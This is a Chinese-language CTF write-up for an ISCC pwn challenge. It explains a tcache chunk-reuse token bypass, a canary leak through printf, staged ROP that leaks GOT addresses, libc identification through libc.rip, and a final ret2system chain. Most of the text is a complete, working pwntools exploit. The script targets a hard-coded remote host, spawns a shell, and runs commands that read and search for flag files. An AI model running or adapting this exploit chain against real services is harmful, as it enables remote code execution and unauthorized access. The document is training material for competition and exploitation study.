
解题思路（必须包含文字说明+截图）
1. 基础信息探测：分析提供的附件可知，这是一个未去除符号表的 64 位 ELF 程序。保护机制方面启用了 NX 和 Canary，但未开启 PIE。程序运行过程中的核心逻辑主要涉及 func2、func3、func_gate 以及 func4 这几个关键函数。
2. Token 绕过与验证：在 func2 执行时，程序会首先调用 malloc(0x48) 分配内存并写入字符串 hack，随后立刻将其 free 释放。接着，程序允许用户自定义大小进行 malloc 分配。只要我们构造 72 的申请长度，就能恰好重用到刚刚释放的那个 tcache chunk。在此基础上再次输入 hack，即可绕过基于原指针的 strncmp 校验，成功将 secret 变量的值修改成 0x378。
3. 绕过 Canary 保护与分段 ROP 构造：函数 func3 中存在 read(0, buf, 0x49) 的调用，缓冲区位于 rbp-0x20 的位置，计算得出其与 canary 之间相差 24 个字节。在首轮 read 读入时，我们填充 25 个字符 A 来淹没 canary 末尾的低位 0 截断符，借由 printf("%s") 顺带打印出剩余的 7 字节 canary 内容。由于第二轮 read 操作空间受限（至多塞入 4 个 qword 的 ROP 链），故采取多次循环 ROP 的策略：每一次循环仅执行单一任务，即利用 GOT 表输出一个函数的真实地址，随后跳回 main 函数以便继续后续操作。
4. Libc 版本动态获取：由于远程服务器的 libc 环境和本地附件提供的不同，因此无法直接使用固定偏移相减。这里在 EXP 脚本中采取了连续收集 puts、read 以及 setvbuf 这三个函数实际内存绝对地址的方法，随后将它们传给 libc.rip API 进行自动寻址与匹配，成功精准定位到 libc6_2.23-0ubuntu11.3_amd64 版本。最后，利用该库特有的 puts、system 和 str_bin_sh 等相关偏移量，算出后续执行 system('/bin/sh') 所需的具体地址。
5. 获取 Flag：在顺利拿到正确的 libc 基址并掌握 canary 值之后，重新触发并步入 func3。此时注入预先构造好的 ret; pop rdi; ret; /bin/sh; system 攻击链来获取交互式 shell。最终通过执行 cat /flag 等指令，成功提取并得到：ISCC{42acc744-0b81-4961-b93e-9ae06033b98e}。

Exp（如有，请粘贴完整代码，不允许截图！）
```python
#!/usr/bin/env python3
from pwn import *
import re
import requests
context(os="linux", arch="amd64", log_level="info", timeout=5)
HOST = "39.96.193.120"
PORT = 10007
BIN = "./attachment/entrance"
LIBC_API = "https://libc.rip/api/find"
elf = ELF(BIN, checksec=False)
POP_RDI = 0x4018F3
RET = 0x40101A
PUTS_PLT = elf.plt["puts"]
MAIN = elf.symbols["main"]
LEAK_ORDER = ["puts", "read", "setvbuf", "printf", "fwrite"]
MAX_BOOTSTRAP_TRIES = 8
GOT_TARGETS = {
    "puts": elf.got["puts"],
    "read": elf.got["read"],
    "setvbuf": elf.got["setvbuf"],
    "printf": elf.got["printf"],
    "fwrite": elf.got["fwrite"],
}
def start():
    if args.LOCAL:
        return process(BIN)
    return remote(HOST, PORT)
def enter_secret(io):
    io.recvuntil(b"Enter token length:")
    io.sendline(b"72")
    io.recvuntil(b"Please enter the access key:")
    io.sendline(b"hack")
    io.recvuntil(b"hello\n")
def sync_func3(io):
    io.recvuntil(b"hello\n")
def leak_canary(io):
    marker = b"A" * 25
    io.send(marker)
    data = io.recvuntil(b".congratulate to you", timeout=5)
    pos = data.find(marker)
    if pos < 0:
        raise RuntimeError(f"canary marker not found: {data!r}")
    leak = data[pos + len(marker):].split(b".congratulate", 1)[0]
    if len(leak) < 7:
        raise RuntimeError(f"short canary leak: {leak!r}")
    canary = u64(b"\x00" + leak[:7])
    log.success(f"canary = {canary:#x}")
    return canary
def quiet_first_read(io):
    io.send(b"A\x00")
    io.recvuntil(b".congratulate to you", timeout=5)
def rop_payload(canary, chain):
    payload = b"A" * 24
    payload += p64(canary)
    payload += b"B" * 8
    payload += b"".join(p64(x) for x in chain)
    assert len(payload) <= 0x49
    return payload
def parse_puts_leak(line):
    data = line.rstrip(b"\n")
    if not data:
        raise RuntimeError("empty leak line")
    addr = u64(data.ljust(8, b"\x00"))
    return addr, data
def do_leak(io, canary, symbol):
    chain = [POP_RDI, GOT_TARGETS[symbol], PUTS_PLT, MAIN]
    io.send(rop_payload(canary, chain))
    io.recvuntil(b"It is good to see you \n", timeout=5)
    line = io.recvline(timeout=5)
    if not line:
        raise RuntimeError(f"no leak line for {symbol}")
    addr, raw = parse_puts_leak(line)
    log.success(f"{symbol} = {addr:#x} raw={raw!r}")
    return addr
def bootstrap(io, names):
    enter_secret(io)
    canary = leak_canary(io)
    leaks = {}
    first = True
    for symbol in names:
        if not first:
            sync_func3(io)
            quiet_first_read(io)
        leaks[symbol] = do_leak(io, canary, symbol)
        first = False
    return canary, leaks
def query_libc_candidates(leaks):
    data = {"symbols": {name: hex(addr) for name, addr in leaks.items()}}
    resp = requests.post(LIBC_API, json=data, timeout=15)
    resp.raise_for_status()
    candidates = resp.json()
    filtered = []
    seen = set()
    for cand in candidates:
        cid = cand.get("id", "")
        syms = cand.get("symbols", {})
        if "amd64" not in cid:
            continue
        need = set(leaks) | {"puts", "system", "str_bin_sh"}
        if not need.issubset(syms):
            continue
        base = leaks["puts"] - int(syms["puts"], 16)
        if base & 0xFFF:
            continue
        if any(leaks[name] - int(syms[name], 16) != base for name in leaks):
            continue
        key = (syms["puts"], syms["system"], syms["str_bin_sh"])
        if key in seen:
            continue
        seen.add(key)
        filtered.append(cand)
    if not filtered:
        raise RuntimeError(f"no usable libc candidates from {len(candidates)} matches")
    filtered.sort(key=lambda cand: ("i386" in cand["id"], cand["id"]))
    log.info(f"libc.rip candidates: {[cand['id'] for cand in filtered[:5]]}")
    return filtered
def compute_candidate_base(candidate, leaked_puts):
    return leaked_puts - int(candidate["symbols"]["puts"], 16)
def attempt_shell(io, canary, candidate, leaked_puts):
    syms = candidate["symbols"]
    base = compute_candidate_base(candidate, leaked_puts)
    system = base + int(syms["system"], 16)
    binsh = base + int(syms["str_bin_sh"], 16)
    log.info(f"trying {candidate['id']}")
    log.success(f"libc base = {base:#x}")
    log.success(f"system = {system:#x}")
    log.success(f"/bin/sh = {binsh:#x}")
    sync_func3(io)
    quiet_first_read(io)
    io.send(rop_payload(canary, [RET, POP_RDI, binsh, system]))
    io.recvuntil(b"It is good to see you \n", timeout=5)
    cmd = (
        b"echo __SHELL_OK__;"
        b"cat /flag 2>/dev/null;"
        b"cat /flag.txt 2>/dev/null;"
        b"cat ./flag 2>/dev/null;"
        b"cat ./flag.txt 2>/dev/null;"
        b"find / -maxdepth 3 -type f \\( -iname flag -o -iname flag.txt -o -iname '*flag*' \\) 2>/dev/null | head -20;"
        b"exit\n"
    )
    io.send(cmd)
    out = io.recvrepeat(2)
    text = out.decode(errors="ignore")
    print(text)
    m = re.search(r"ISCC\{[^}\r\n]+\}", text)
    if m:
        log.success(f"flag = {m.group(0)}")
        return m.group(0)
    if "__SHELL_OK__" not in text:
        raise RuntimeError("shell marker not observed")
    raise RuntimeError("shell acquired but flag not found in output")
def leak_candidates():
    last_exc = None
    for attempt in range(1, MAX_BOOTSTRAP_TRIES + 1):
        io = start()
        try:
            canary, leaks = bootstrap(io, LEAK_ORDER[:3])
            candidates = query_libc_candidates(leaks)
            return io, canary, leaks, candidates
        except Exception as exc:
            last_exc = exc
            log.warning(f"bootstrap attempt {attempt} failed: {exc}")
            io.close()
    raise last_exc
def fresh_puts_leak():
    last_exc = None
    for attempt in range(1, MAX_BOOTSTRAP_TRIES + 1):
        io = start()
        try:
            canary, leaks = bootstrap(io, ["puts"])
            return io, canary, leaks["puts"]
        except Exception as exc:
            last_exc = exc
            log.warning(f"puts-only bootstrap attempt {attempt} failed: {exc}")
            io.close()
    raise last_exc
def main():
    io, canary, leaks, candidates = leak_candidates()
    try:
        for idx, cand in enumerate(candidates):
            try:
                if idx == 0:
                    return attempt_shell(io, canary, cand, leaks["puts"])
                io.close()
                io, canary, leaked_puts = fresh_puts_leak()
                return attempt_shell(io, canary, cand, leaked_puts)
            except Exception as exc:
                log.warning(f"candidate {cand['id']} failed: {exc}")
                continue
        raise RuntimeError("all libc candidates failed")
    finally:
        try:
            io.close()
        except Exception:
            pass
if __name__ == "__main__":
    main()
```